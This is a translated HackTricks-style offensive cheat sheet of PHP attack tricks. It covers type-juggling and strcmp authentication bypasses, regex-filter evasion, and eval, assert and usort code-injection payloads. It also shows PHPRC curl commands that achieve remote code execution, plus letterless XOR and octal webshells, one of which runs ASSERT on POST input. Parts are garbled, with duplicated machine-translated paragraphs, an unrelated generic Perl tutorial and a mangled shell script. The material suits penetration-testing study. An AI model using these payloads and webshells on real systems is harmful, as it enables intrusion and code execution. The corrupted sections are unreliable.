# PHP Trikovi

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Uobičajeno mesto za kolačiće (Cookies):

Ovo takođe važi za kolačiće phpMyAdmin-a.

Kolačići:
```
PHPSESSID
phpMyAdmin
```
Lokacije:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Bypassiranje PHP poređenja

### Labava poređenja/Tip Juggling ( == )

Ako se koristi `==` u PHP-u, postoje neočekivani slučajevi u kojima poređenje ne radi kako se očekuje. To je zato što "==" samo upoređuje vrednosti transformisane u isti tip, ako želite da uporedite i da li je tip upoređenih podataka isti, morate koristiti `===`.

Tabele PHP poređenja: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` String koji ne počinje brojem je jednak broju
* `"0xAAAA" == "43690" -> True` Stringovi sastavljeni od brojeva u dec ili heks formatu mogu biti upoređeni sa drugim brojevima/stringovima sa rezultatom True ako su brojevi isti (brojevi u stringu se tumače kao brojevi)
* `"0e3264578" == 0 --> True` String koji počinje sa "0e" i koji je praćen bilo čim će biti jednak 0
* `"0X3264578" == 0X --> True` String koji počinje sa "0" i koji je praćen bilo kojim slovom (X može biti bilo koje slovo) i praćen bilo čim će biti jednak 0
* `"0e12334" == "0" --> True` Ovo je veoma interesantno jer u nekim slučajevima možete kontrolisati string unos "0" i neki sadržaj koji se hešira i upoređuje sa njim. Dakle, ako možete obezbediti vrednost koja će stvoriti heš koji počinje sa "0e" i bez ikakvog slova, možete zaobići poređenje. Možete pronaći **već heširane stringove** sa ovim formatom ovde: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Bilo koje slovo u stringu je jednako celobrojnoj vrednosti 0

Više informacija na [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Tip Juggling** takođe utiče na funkciju `in_array()` podrazumevano (trebate postaviti treći argument na true da biste napravili strogo poređenje):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Ako se ova funkcija koristi za **bilo koju provjeru autentifikacije** (kao što je provjera lozinke) i korisnik kontroliše jednu stranu poređenja, može poslati prazan niz umesto stringa kao vrednost lozinke (`https://example.com/login.php/?username=admin&password[]=`) i zaobići ovu provjeru:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
Isti problem se javlja i sa `strcasecmp()`

### Strogo tipiziranje

Čak i ako se koristi `===`, mogu se javiti greške koje čine poređenje podložnim tipiziranju. Na primer, ako se poređenje vrši konvertovanjem podataka u drugi tip objekta pre poređenja:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** može se koristiti za **validaciju korisničkog unosa** (proverava da li je bilo koja **reč/regex** iz **crne liste** prisutna u **korisničkom unosu** i ako nije, kod može nastaviti sa izvršavanjem).

#### Bypass za novu liniju

Međutim, kada se deliminiše početak regexa `preg_match()` **proverava samo prvu liniju korisničkog unosa**, pa ako na neki način možete **poslati** unos u **nekoliko linija**, možete zaobići ovu proveru. Primer:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Da biste zaobišli ovu provjeru, možete **poslati vrijednost s novim redovima urlencoded** (`%0A`) ili, ako možete poslati **JSON podatke**, pošaljite ih u **nekoliko linija**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Pronađite primer ovde: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Bypass greške dužine**

(Ovaj bypass je navodno pokušan na PHP 5.2.5 i nisam uspeo da ga pokrenem na PHP 7.3.15)\
Ako možete poslati `preg_match()` funkciji validan veoma **veliki unos**, ona ga **neće moći obraditi** i moći ćete da **zaobiđete** proveru. Na primer, ako je na crnoj listi JSON, možete poslati:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### Bypassiranje ReDoS-a

Trik sa: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)


<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Ukratko, problem se javlja jer `preg_*` funkcije u PHP-u koriste [PCRE biblioteku](http://www.pcre.org/) za obradu regularnih izraza. U PCRE-u se određeni regularni izrazi podudaraju koristeći mnogo rekurzivnih poziva, što zauzima puno prostora na steku. Moguće je postaviti ograničenje na broj dozvoljenih rekurzija, ali u PHP-u je to ograničenje [podrazumevano postavljeno na 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), što je više nego što stane na stek.

[U ovom Stackoverflow thread-u](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) takođe je povezan post gde se detaljnije govori o ovom problemu. Naš zadatak je sada bio jasan:\
**Poslati unos koji će naterati regex da izvrši 100.000+ rekurzija, izazivajući SIGSEGV, što će dovesti do toga da `preg_match()` funkcija vrati `false`, čime će aplikacija smatrati da naš unos nije zlonameran, a na kraju payload-a izazvati iznenađenje nečim poput `{system(<veomaopasnakomanda>)}` kako bismo dobili SSTI --> RCE --> zastavica :)**.

Pa, u terminima regularnih izraza, zapravo ne radimo 100k "rekurzija", već brojimo "korake povratka", što prema [PHP dokumentaciji](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) podrazumevano iznosi 1\_000\_000 (1M) u promenljivoj `pcre.backtrack_limit`.\
Da bismo to postigli, `'X'*500_001` će rezultirati sa 1 milion koraka povratka (500k unapred i 500k unazad):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Tipovanje tipova za PHP obfuskaciju

Type juggling is a technique used in PHP to perform implicit type conversions. It can be leveraged for obfuscation purposes, making the code harder to understand and analyze. 

Tipovanje tipova je tehnika koja se koristi u PHP-u za implicitnu konverziju tipova. Može se iskoristiti u svrhu obfuskacije, čime se kod čini težim za razumijevanje i analizu.

In PHP, type juggling occurs when an operator or function is applied to operands of different types. PHP will automatically convert the operands to a common type before performing the operation. This behavior can be exploited to manipulate the program flow and bypass certain security checks.

U PHP-u, tipovanje tipova se javlja kada se operator ili funkcija primjenjuju na operande različitih tipova. PHP će automatski konvertovati operande u zajednički tip prije izvršavanja operacije. Ovo ponašanje se može iskoristiti za manipulaciju tokom programa i zaobilaženje određenih sigurnosnih provjera.

For example, consider the following code snippet:

Na primjer, razmotrite sljedeći isječak koda:

```php
$var1 = "10";
$var2 = 10;

if ($var1 == $var2) {
    echo "Equal";
} else {
    echo "Not equal";
}
```

In this case, the `==` operator is used to compare `$var1` and `$var2`. Despite having different types (string and integer), PHP will convert them to a common type (integer) and evaluate the comparison. As a result, the output will be "Equal".

U ovom slučaju, operator `==` se koristi za usporedbu `$var1` i `$var2`. Bez obzira na to što imaju različite tipove (string i integer), PHP će ih konvertovati u zajednički tip (integer) i evaluirati usporedbu. Kao rezultat, ispis će biti "Equal".

This behavior can be used to obfuscate code by manipulating the types of variables and bypassing certain checks. It is important to be aware of this technique when analyzing PHP code for security vulnerabilities.

Ovo ponašanje se može koristiti za obfuskaciju koda manipulacijom tipova varijabli i zaobilaženjem određenih provjera. Važno je biti svjestan ove tehnike prilikom analize PHP koda u potrazi za sigurnosnim ranjivostima.
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Izvrši nakon preusmeravanja (EAR)

Ako PHP preusmerava na drugu stranicu, ali nijedna funkcija **`die`** ili **`exit`** nije **pozvana nakon postavljanja zaglavlja `Location`**, PHP nastavlja izvršavanje i dodaje podatke u telo:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Još trikova

* **register\_globals**: U **PHP < 4.1.1.1** ili ako je loše konfigurisan, **register\_globals** može biti aktivan (ili se njihovo ponašanje oponaša). Ovo implicira da u globalnim varijablama poput $\_GET, ako imaju vrednost npr. $\_GET\["param"]="1234", možete pristupiti tome putem **$param. Dakle, slanjem HTTP parametara možete prebrisati varijable** koje se koriste u kodu.
* **PHPSESSION kolačići istog domena se čuvaju na istom mestu**, stoga ako se unutar domena **koriste različiti kolačići na različitim putanjama**, možete postaviti da jedna putanja **pristupa kolačiću druge putanje** postavljanjem vrednosti kolačića druge putanje.\
Na ovaj način, ako **obe putanje pristupaju promenljivoj sa istim imenom**, možete postaviti da **vrednost te promenljive u putanji 1 važi za putanju 2**. A zatim će putanja 2 smatrati važećim promenljive putanje 1 (dajući kolačiću ime koje odgovara putanji 2).
* Kada imate **korisnička imena** korisnika mašine, proverite adresu: **/\~\<KORISNIČKO IME>** da biste videli da li su PHP direktorijumi aktivirani.
* [**LFI i RCE korišćenjem php omotača**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Ove funkcije se obično koriste u PHP-u za **generisanje heševa od lozinki** i za **proveru** da li je lozinka ispravna u poređenju sa hešom.\
Podržani algoritmi su: `PASSWORD_DEFAULT` i `PASSWORD_BCRYPT` (počinje sa `$2y$`). Imajte na umu da je **PASSWORD\_DEFAULT često isto što i PASSWORD\_BCRYPT**. Trenutno, **PASSWORD\_BCRYPT** ima **ograničenje veličine unosa od 72 bajta**. Stoga, kada pokušate da hešujete nešto veće od 72 bajta ovim algoritmom, koristiće se samo prvih 72B:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### Zaobilaženje HTTP zaglavlja zloupotrebom PHP grešaka

Ako **PHP stranica ispisuje greške i prikazuje unos koji je korisnik pružio**, korisnik može naterati PHP server da ispiše **dovoljno dugačak sadržaj** tako da kada pokuša **dodati zaglavlja** u odgovor, server će baciti grešku.\
U sledećem scenariju, **napadač je naterao server da izbaci neke velike greške**, i kao što možete videti na slici, kada je PHP pokušao **izmeniti informacije zaglavlja, nije mogao** (tako da na primer CSP zaglavlje nije poslato korisniku):

![](<../../../.gitbook/assets/image (465).png>)

## Izvršavanje koda

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Pogledajte ovo za više korisnih PHP funkcija](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Da bi se izvršio kod u "replace" argumentu, potrebno je imati barem jedno poklapanje.\
Ova opcija preg\_replace funkcije je **zastarela od PHP 5.5.0.**

### **RCE putem Eval() funkcije**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE putem Assert()**

Ova funkcija u php-u vam omogućava da **izvršite kod koji je napisan u stringu** kako biste **vratili tačno ili netačno** (i na osnovu toga promenili izvršenje). Obično će korisnička promenljiva biti umetnuta u sredinu stringa. Na primer:\
`assert("strpos($_GET['page']),'..') === false")` --> U ovom slučaju, da biste dobili **RCE**, možete uraditi:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Morate **prekinuti** sintaksu koda, **dodati** svoj **payload**, a zatim je ponovo **popraviti**. Možete koristiti **logičke operacije** poput "**and" ili "%26%26" ili "|"**. Imajte na umu da "or", "||" ne funkcionišu jer ako je prvi uslov tačan, naš payload se neće izvršiti. Isto tako, ";" ne funkcioniše jer naš payload neće biti izvršen.

**Druga opcija** je dodati izvršavanje komande u string: `'.highlight_file('.passwd').'`

**Druga opcija** (ako imate interni kod) je izmeniti neku promenljivu da biste promenili izvršavanje: `$file = "hola"`

### **RCE putem usort()**

Ova funkcija se koristi za sortiranje niza stavki koristeći određenu funkciju.\
Da biste zloupotrebili ovu funkciju:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
Možete koristiti **//** za komentarisanje ostatka koda.

Da biste otkrili broj zagrada koje trebate zatvoriti:

* `?order=id;}//`: dobijamo poruku o grešci (`Parse error: syntax error, unexpected ';'`). Verovatno nam nedostaje jedna ili više zagrada.
* `?order=id);}//`: dobijamo **upozorenje**. To izgleda ispravno.
* `?order=id));}//`: dobijamo poruku o grešci (`Parse error: syntax error, unexpected ')' i`). Verovatno imamo previše zatvorenih zagrada.

### **RCE putem .httaccess**

Ako možete **učitati** **.htaccess**, onda možete **konfigurisati** nekoliko stvari i čak izvršiti kod (konfigurisanjem da se fajlovi sa ekstenzijom .htaccess mogu **izvršiti**).

Različiti .htaccess školjke mogu se pronaći [ovde](https://github.com/wireghoul/htshells)

### RCE putem Env promenljivih

Ako pronađete ranjivost koja vam omogućava da **izmenite env promenljive u PHP-u** (i još jednu za otpremanje fajlova, mada uz više istraživanja možda se to može zaobići), možete iskoristiti ovaj ponašanje da biste dobili **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Ova env promenljiva omogućava vam da učitate proizvoljne biblioteke prilikom izvršavanja drugih binarnih fajlova (mada u ovom slučaju možda neće raditi).
* **`PHPRC`** : Instruiše PHP **gde da pronađe svoj konfiguracioni fajl**, obično nazvan `php.ini`. Ako možete otpremiti svoj sopstveni konfiguracioni fajl, koristite `PHPRC` da usmerite PHP na njega. Dodajte unos **`auto_prepend_file`** koji navodi drugi otpremljeni fajl. Taj drugi fajl sadrži normalan **PHP kod koji se zatim izvršava** od strane PHP izvršnog okruženja pre bilo kog drugog koda.
1. Otpremite PHP fajl koji sadrži naš shell kod
2. Otpremite drugi fajl koji sadrži direktivu **`auto_prepend_file`** koja instruiše PHP preprocesor da izvrši fajl koji smo otpremili u koraku 1
3. Postavite promenljivu `PHPRC` na fajl koji smo otpremili u koraku 2.
* Dobijte više informacija o tome kako izvršiti ovaj lanac [**iz originalnog izveštaja**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - još jedna opcija
* Ako **ne možete otpremiti fajlove**, možete koristiti u FreeBSD-u "fajl" `/dev/fd/0` koji sadrži **`stdin`**, tj. **telo** zahteva poslatog na `stdin`:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Ili da biste dobili RCE, omogućite **`allow_url_include`** i dodajte fajl sa **base64 PHP kodom**:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Tehnika [**iz ovog izveštaja**](https://vulncheck.com/blog/juniper-cve-2023-36845).

## PHP statička analiza

Pogledajte da li možete ubaciti kod u pozive ovih funkcija (sa [ovog](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be) mesta):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Ako debagujete PHP aplikaciju, možete globalno omogućiti prikazivanje grešaka u `/etc/php5/apache2/php.ini` dodavanjem `display_errors = On` i restartovati apache: `sudo systemctl restart apache2`

### Deobfuskacija PHP koda

Možete koristiti **veb**[ **www.unphp.net**](http://www.unphp.net) **za deobfuskaciju PHP koda.**

## PHP omotači i protokoli

PHP omotači i protokoli mogu vam omogućiti da **zaobiđete zaštitu pisanja i čitanja** u sistemu i kompromitujete ga. Za [**više informacija pogledajte ovu stranicu**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug neautentifikovani RCE

Ako vidite da je **Xdebug** **omogućen** u izlazu `phpconfig()`, trebali biste pokušati dobiti RCE putem [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Promenljive promenljivih
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## Zloupotreba RCE-a koristeći novi $\_GET\["a"]\($\_GET\["b"])

Ako na stranici možete **kreirati novi objekat proizvoljne klase**, možda ćete moći dobiti RCE, proverite sledeću stranicu da biste saznali kako:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Izvršavanje PHP koda bez slova

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Korišćenje oktalnog sistema
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

XOR (Exclusive OR) je logički operator koji se koristi za izvršavanje ekskluzivne disjunkcije između dva izraza. U kontekstu hakovanja, XOR se često koristi za enkripciju i dekripciju podataka.

XOR enkripcija se postiže kombinovanjem podataka sa ključem koristeći XOR operaciju. Ključ se može sastojati od niza bitova ili bajtova. Kada se primeni XOR operacija na podatke i ključ, rezultat je kriptovani podatak. Da bi se dekriptovali podaci, isti ključ se ponovo primenjuje na kriptovane podatke koristeći XOR operaciju.

XOR operacija je posebno korisna u hakovanju jer može biti korišćena za skrivanje ili otežavanje otkrivanja određenih informacija. Na primer, XOR može biti korišćen za enkripciju lozinke ili za skrivanje ključnih informacija u malveru.

Kada se koristi u kontekstu hakovanja, XOR može biti veoma moćan alat. Međutim, važno je napomenuti da XOR enkripcija nije dovoljno jaka sama po sebi i da se često koristi u kombinaciji sa drugim enkripcijskim tehnikama radi postizanja veće sigurnosti.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR jednostavan shell kod

Prema [**ovom objašnjenju**](https://mgp25.com/ctf/Web-challenge/), moguće je generisati jednostavan shell kod na sledeći način:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Dakle, ako možete **izvršiti proizvoljni PHP bez brojeva i slova**, možete poslati zahtev kao što je sledeće zloupotrebljavajući taj payload za izvršavanje proizvoljnog PHP koda:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Za detaljnije objašnjenje pogledajte [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcode (unutar eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl slično

Perl je interpretirani jezik visokog nivoa koji se često koristi za obradu teksta i automatizaciju zadataka. Ima mnoge sličnosti sa PHP-om, ali se koristi na različitim platformama i ima neke specifične karakteristike.

#### Osnovna sintaksa

Perl koristi `$` za deklarisanje promenljivih, kao i PHP. Na primer:

```perl
$broj = 10;
$niska = "Hello, world!";
@niz = (1, 2, 3, 4, 5);
%hash = ('kljuc1', 'vrednost1', 'kljuc2', 'vrednost2');
```

#### Rad sa nizovima

Perl ima bogat skup funkcija za rad sa nizovima. Na primer, možete koristiti `push` funkciju za dodavanje elemenata na kraj niza:

```perl
@niz = (1, 2, 3);
push(@niz, 4);
```

#### Rad sa stringovima

Perl takođe ima mnoge funkcije za rad sa stringovima. Na primer, možete koristiti `length` funkciju za dobijanje dužine stringa:

```perl
$niska = "Hello, world!";
$duljina = length($niska);
```

#### Rad sa regularnim izrazima

Perl je poznat po svojoj podršci za regularne izraze. Možete koristiti regularne izraze za pretragu i manipulaciju stringova. Na primer, možete koristiti `=~` operator za proveru da li string odgovara određenom obrascu:

```perl
$niska = "Hello, world!";
if ($niska =~ /world/) {
    print "String sadrži 'world'.";
}
```

#### Izvršavanje sistema

Perl vam omogućava izvršavanje sistema i komandnih linija. Na primer, možete koristiti `system` funkciju za izvršavanje komande:

```perl
system("ls -l");
```

#### Zaključak

Perl je moćan jezik koji ima mnoge sličnosti sa PHP-om. Ako ste već upoznati sa PHP-om, lako ćete se prilagoditi Perl-u i iskoristiti njegove funkcionalnosti za obradu teksta i automatizaciju zadataka.
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
